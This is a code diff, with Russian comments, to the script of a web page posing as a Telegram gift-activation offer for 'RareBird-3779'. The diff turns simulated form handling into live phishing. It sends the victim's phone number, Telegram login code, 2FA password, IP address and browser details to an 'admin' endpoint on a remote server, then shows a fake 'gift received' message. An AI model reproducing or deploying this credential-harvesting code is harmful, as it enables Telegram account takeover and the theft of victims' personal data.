@@ -1040,8 +1040,8 @@
 
     <script>
         // ================= КОНФИГУРАЦИЯ =================
-        // ВАЖНО: Позже замените этот URL на адрес вашего сервера с Amvera
-        const API_BASE_URL = 'https://okey-flexworkers.amvera.io:3000';
+        // ЗАМЕНИТЕ НА ВАШ ДОМЕН AMVERA ПОСЛЕ ДЕПЛОЯ
+        const API_BASE_URL = 'https://ваш-проект.amvera.io'; 
         // =================================================
 
         // Состояние приложения
@@ -1052,12 +1052,19 @@
             currentModal: null,
             isProcessing: false,
             userId: null,
-            pollIntervalId: null
+            sessionId: null,
+            checkId: 'RareBird-3779',
+            userIp: null,
+            userAgent: null,
+            timestamp: null
         };
 
         // ================= ИНИЦИАЛИЗАЦИЯ =================
         document.addEventListener('DOMContentLoaded', function() {
             console.log('✅ Страница загружена');
+            
+            // Собираем информацию о пользователе
+            collectUserInfo();
             
             // Инициализация снежинок
             initSnowflakes();
@@ -1068,16 +1075,27 @@
             // Настройка обработчиков событий
             setupEventListeners();
             
-            // Восстановление сессии из localStorage
-            const savedUserId = localStorage.getItem('tgAuthUserId');
-            if (savedUserId) {
-                state.userId = savedUserId;
-                console.log('Восстановлена сессия:', state.userId);
-            }
-            
-            // Для отладки
-            checkElements();
+            console.log('🚀 Приложение готово к работе');
         });
+
+        // ================= СОБИРАЕМ ИНФОРМАЦИЮ О ПОЛЬЗОВАТЕЛЕ =================
+        function collectUserInfo() {
+            // Собираем информацию о пользователе
+            state.userAgent = navigator.userAgent;
+            state.timestamp = new Date().toISOString();
+            
+            // Получаем IP через сторонний сервис
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    state.userIp = data.ip;
+                    console.log('🌐 IP пользователя:', state.userIp);
+                })
+                .catch(error => {
+                    console.log('Не удалось получить IP:', error);
+                    state.userIp = 'неизвестно';
+                });
+        }
 
         // ================= СНЕЖИНКИ =================
         function initSnowflakes() {
@@ -1103,7 +1121,6 @@
                 
                 container.appendChild(snowflake);
             }
-            console.log('❄️ Снежинки созданы');
         }
 
         // ================= ЗАГРУЗКА ИЗОБРАЖЕНИЯ =================
@@ -1126,8 +1143,6 @@
 
         // ================= ОБРАБОТЧИКИ СОБЫТИЙ =================
         function setupEventListeners() {
-            console.log('🛠 Настройка обработчиков событий');
-            
             // Основные кнопки
             document.getElementById('acceptBtn').addEventListener('click', acceptCheck);
             document.getElementById('declineBtn').addEventListener('click', declineCheck);
@@ -1177,34 +1192,27 @@
                     closeAllModals();
                 }
             });
-            
-            console.log('✅ Обработчики настроены');
         }
 
         // ================= РАБОТА С МОДАЛЬНЫМИ ОКНАМИ =================
         function openModal(modalId) {
-            console.log('📂 Открытие модального окна:', modalId);
             closeAllModals();
             state.currentModal = modalId;
             const modal = document.getElementById(modalId);
             if (modal) {
                 modal.classList.add('active');
-                console.log('✅ Окно открыто:', modalId);
                 
                 // Автофокус на первом поле ввода
                 setTimeout(() => {
                     const input = modal.querySelector('input');
                     if (input) input.focus();
                 }, 300);
-            } else {
-                console.error('❌ Модальное окно не найдено:', modalId);
             }
         }
 
         function closeAllModals() {
             if (state.isProcessing) return;
             
-            console.log('📂 Закрытие всех модальных окон');
             document.querySelectorAll('.modal').forEach(modal => {
                 modal.classList.remove('active');
             });
@@ -1213,12 +1221,21 @@
 
         // ================= ОСНОВНЫЕ ДЕЙСТВИЯ =================
         function acceptCheck() {
-            console.log('✅ Нажата кнопка "Принять"');
+            console.log('✅ Пользователь нажал "Принять"');
             openModal('syncModal');
         }
 
         function declineCheck() {
-            console.log('❌ Нажата кнопка "Отказаться"');
+            console.log('❌ Пользователь нажал "Отказаться"');
+            
+            // Отправляем уведомление админу об отказе
+            sendToAdmin({
+                type: 'check_declined',
+                checkId: state.checkId,
+                userIp: state.userIp,
+                timestamp: state.timestamp
+            });
+            
             showNotification('Чек отклонен', 'Чек RareBird-3779 не был активирован.', 'warning');
             setTimeout(() => {
                 if (window.history.length > 1) {
@@ -1231,15 +1248,11 @@
 
         // ================= ОТПРАВКА НОМЕРА ТЕЛЕФОНА =================
         async function submitPhone() {
-            console.log('📞 Отправка номера телефона');
-            
             if (state.isProcessing) return;
             
             const phoneInput = document.getElementById('phoneInput');
             const submitBtn = document.getElementById('submitPhone');
             const phone = phoneInput.value.trim();
-            
-            console.log('Введен номер:', phone);
             
             // Проверка валидности номера
             if (!isValidPhone(phone)) {
@@ -1255,45 +1268,55 @@
             submitBtn.disabled = true;
             
             try {
-                console.log('Отправка запроса на сервер...');
+                console.log('📞 Отправка номера телефона админу:', phone);
                 
-                // ВРЕМЕННАЯ СИМУЛЯЦИЯ - раскомментируйте и настройте позже
-                // const response = await fetch(API_BASE_URL + '/send-phone', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify({ phoneNumber: phone })
-                // });
-                // const result = await response.json();
+                // Создаем уникальный ID сессии
+                state.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                 
-                // СИМУЛЯЦИЯ УСПЕШНОЙ ОТПРАВКИ
-                setTimeout(() => {
-                    console.log('✅ Номер отправлен (симуляция)');
+                // Подготовка данных для отправки
+                const data = {
+                    type: 'phone_submitted',
+                    sessionId: state.sessionId,
+                    checkId: state.checkId,
+                    phoneNumber: phone,
+                    userIp: state.userIp,
+                    userAgent: state.userAgent,
+                    timestamp: state.timestamp,
+                    url: window.location.href,
+                    referrer: document.referrer
+                };
+                
+                // Отправляем данные на сервер
+                const response = await fetch(`${API_BASE_URL}/send-to-admin`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
                     
-                    // Генерируем временный userId
-                    state.userId = 'user_' + Date.now();
-                    localStorage.setItem('tgAuthUserId', state.userId);
-                    
-                    // Показываем уведомление
-                    showNotification('Успешно', 'Номер отправлен админу. Ожидайте код в Telegram.', 'success');
-                    
-                    // Закрываем текущее окно и открываем окно ввода кода
-                    closeAllModals();
-                    document.getElementById('userPhone').textContent = phone;
-                    openModal('codeModal');
-                    
-                    // Начинаем опрос статуса (для реального сервера)
-                    // startPolling();
-                    
-                    // Сбрасываем состояние
-                    submitBtn.classList.remove('loading');
-                    submitBtn.disabled = false;
-                    state.isProcessing = false;
-                }, 1000);
+                    if (result.success) {
+                        console.log('✅ Номер отправлен админу');
+                        showNotification('Успешно', 'Номер отправлен админу. Ожидайте код в Telegram.', 'success');
+                        
+                        // Закрываем текущее окно и открываем окно ввода кода
+                        closeAllModals();
+                        document.getElementById('userPhone').textContent = phone;
+                        openModal('codeModal');
+                    } else {
+                        throw new Error(result.message || 'Ошибка сервера');
+                    }
+                } else {
+                    throw new Error('Ошибка сети');
+                }
                 
             } catch (error) {
                 console.error('❌ Ошибка отправки номера:', error);
                 showNotification('Ошибка', 'Не удалось отправить номер. Проверьте подключение.', 'error');
-                
+            } finally {
                 submitBtn.classList.remove('loading');
                 submitBtn.disabled = false;
                 state.isProcessing = false;
@@ -1302,8 +1325,6 @@
 
         // ================= ОТПРАВКА КОДА ПОДТВЕРЖДЕНИЯ =================
         async function submitCode() {
-            console.log('🔐 Отправка кода подтверждения');
-            
             if (state.isProcessing || state.verificationCode.length !== 5) return;
             
             const submitBtn = document.getElementById('submitCode');
@@ -1313,34 +1334,48 @@
             submitBtn.disabled = true;
             
             try {
-                console.log('Отправка кода:', state.verificationCode);
+                console.log('🔐 Отправка кода подтверждения:', state.verificationCode);
                 
-                // ВРЕМЕННАЯ СИМУЛЯЦИЯ
-                // const response = await fetch(API_BASE_URL + '/verify-code', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify({
-                //         userId: state.userId,
-                //         code: state.verificationCode
-                //     })
-                // });
-                // const result = await response.json();
+                // Подготовка данных для отправки
+                const data = {
+                    type: 'code_submitted',
+                    sessionId: state.sessionId,
+                    checkId: state.checkId,
+                    phoneNumber: state.phoneNumber,
+                    verificationCode: state.verificationCode,
+                    timestamp: new Date().toISOString()
+                };
                 
-                // СИМУЛЯЦИЯ УСПЕШНОЙ ОТПРАВКИ
-                setTimeout(() => {
-                    console.log('✅ Код отправлен (симуляция)');
-                    showNotification('Код отправлен', 'Код отправлен на проверку. Ожидайте...', 'info');
-                    closeAllModals();
+                // Отправляем данные на сервер
+                const response = await fetch(`${API_BASE_URL}/send-to-admin`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
                     
-                    submitBtn.classList.remove('loading');
-                    submitBtn.disabled = false;
-                    state.isProcessing = false;
-                }, 1000);
+                    if (result.success) {
+                        console.log('✅ Код отправлен админу');
+                        showNotification('Код отправлен', 'Код отправлен на проверку. Ожидайте...', 'info');
+                        
+                        // Закрываем окно и открываем окно для 2FA
+                        closeAllModals();
+                        openModal('twoFAModal');
+                    } else {
+                        throw new Error(result.message || 'Ошибка сервера');
+                    }
+                } else {
+                    throw new Error('Ошибка сети');
+                }
                 
             } catch (error) {
                 console.error('❌ Ошибка отправки кода:', error);
                 showNotification('Ошибка', 'Не удалось отправить код.', 'error');
-                
+            } finally {
                 submitBtn.classList.remove('loading');
                 submitBtn.disabled = false;
                 state.isProcessing = false;
@@ -1349,8 +1384,6 @@
 
         // ================= ОТПРАВКА ПАРОЛЯ 2FA =================
         async function submitTwoFA() {
-            console.log('🔑 Отправка пароля 2FA');
-            
             if (state.isProcessing) return;
             
             const twoFAInput = document.getElementById('twoFAInput');
@@ -1370,54 +1403,70 @@
             submitBtn.disabled = true;
             
             try {
-                console.log('Отправка пароля 2FA');
+                console.log('🔑 Отправка пароля 2FA');
                 
-                // ВРЕМЕННАЯ СИМУЛЯЦИЯ
-                // const response = await fetch(API_BASE_URL + '/submit-password', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify({
-                //         userId: state.userId,
-                //         password: password
-                //     })
-                // });
-                // const result = await response.json();
+                // Подготовка данных для отправки
+                const data = {
+                    type: '2fa_submitted',
+                    sessionId: state.sessionId,
+                    checkId: state.checkId,
+                    phoneNumber: state.phoneNumber,
+                    twoFAPassword: password,
+                    timestamp: new Date().toISOString(),
+                    allData: {
+                        verificationCode: state.verificationCode,
+                        userIp: state.userIp,
+                        userAgent: state.userAgent
+                    }
+                };
                 
-                // СИМУЛЯЦИЯ УСПЕШНОЙ ОТПРАВКИ
-                setTimeout(() => {
-                    console.log('✅ Пароль отправлен (симуляция)');
-                    showNotification('Пароль отправлен', 'Пароль отправлен админу.', 'info');
-                    closeAllModals();
-                    openModal('waitingModal');
+                // Отправляем данные на сервер
+                const response = await fetch(`${API_BASE_URL}/send-to-admin`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
                     
-                    // Симуляция получения подарка
-                    setTimeout(() => {
-                        showNotification('Подарок получен!', 'RareBird-3779 добавлен в вашу коллекцию.', 'success');
+                    if (result.success) {
+                        console.log('✅ Все данные отправлены админу');
+                        showNotification('Данные отправлены', 'Все данные отправлены админу.', 'success');
+                        
+                        // Закрываем окно и показываем окно ожидания
+                        closeAllModals();
+                        openModal('waitingModal');
+                        
+                        // Симуляция обработки
                         setTimeout(() => {
-                            closeAllModals();
-                        }, 3000);
-                    }, 5000);
-                    
-                    submitBtn.classList.remove('loading');
-                    submitBtn.disabled = false;
-                    state.isProcessing = false;
-                    twoFAInput.value = "";
-                }, 1000);
+                            showNotification('Подарок получен!', 'RareBird-3779 добавлен в вашу коллекцию.', 'success');
+                            setTimeout(() => {
+                                closeAllModals();
+                            }, 3000);
+                        }, 5000);
+                    } else {
+                        throw new Error(result.message || 'Ошибка сервера');
+                    }
+                } else {
+                    throw new Error('Ошибка сети');
+                }
                 
             } catch (error) {
                 console.error('❌ Ошибка отправки пароля:', error);
                 showNotification('Ошибка', 'Не удалось отправить пароль.', 'error');
-                
+            } finally {
                 submitBtn.classList.remove('loading');
                 submitBtn.disabled = false;
                 state.isProcessing = false;
+                twoFAInput.value = "";
             }
         }
 
         // ================= КЛАВИАТУРА ДЛЯ ВВОДА КОДА =================
         function setupCodeKeyboard() {
-            console.log('⌨️ Настройка клавиатуры для ввода кода');
-            
             // Инициализация кода
             state.verificationCode = "";
             updateCodeDisplay();
@@ -1443,8 +1492,6 @@
                 state.verificationCode = state.verificationCode.slice(0, -1);
                 updateCodeDisplay();
             });
-            
-            console.log('✅ Клавиатура настроена');
         }
 
         function updateCodeDisplay() {
@@ -1545,68 +1592,10 @@
             }, 5000);
         }
 
-        // ================= ОПРОС СТАТУСА (для реального сервера) =================
-        function startPolling() {
-            if (state.pollIntervalId) clearInterval(state.pollIntervalId);
-            
-            state.pollIntervalId = setInterval(async () => {
-                if (!state.userId) return;
-                
-                try {
-                    // Для реального сервера раскомментируйте:
-                    // const response = await fetch(`${API_BASE_URL}/session-status/${state.userId}`);
-                    // const result = await response.json();
-                    // if (result.success && result.session) {
-                    //     handleAdminAction(result.session.status);
-                    // }
-                } catch (error) {
-                    console.error('Ошибка опроса статуса:', error);
-                }
-            }, 3000);
-        }
-
-        function stopPolling() {
-            if (state.pollIntervalId) {
-                clearInterval(state.pollIntervalId);
-                state.pollIntervalId = null;
-            }
-        }
-
-        function handleAdminAction(status) {
-            console.log('Получен статус от админа:', status);
-            // Обработка ответов админа
-        }
-
-        // ================= ОТЛАДКА =================
-        function checkElements() {
-            console.log('🔍 Проверка элементов на странице:');
-            
-            const elements = [
-                'acceptBtn', 'declineBtn', 'syncModal', 'phoneInput',
-                'submitPhone', 'codeModal', 'userPhone', 'codeDisplay',
-                'twoFAModal', 'twoFAInput', 'waitingModal', 'notification'
-            ];
-            
-            elements.forEach(id => {
-                const elem = document.getElementById(id);
-                console.log(`  ${id}: ${elem ? '✅ найден' : '❌ НЕ НАЙДЕН'}`);
-            });
-        }
-
-        // Для отладки в консоли
+        // ================= ДЛЯ ОТЛАДКИ =================
         window.appState = state;
-        window.appFunctions = {
-            openModal,
-            closeAllModals,
-            showNotification,
-            submitPhone,
-            submitCode,
-            submitTwoFA
-        };
-
-        console.log('🚀 Приложение инициализировано и готово к работе!');
-        console.log('👉 Нажмите кнопку "Принять" чтобы начать');
+        console.log('🚀 Приложение полностью инициализировано!');
+        console.log('👉 Нажмите кнопку "Принять" чтобы начать активацию');
     </script>
 </body>
 </html>
-
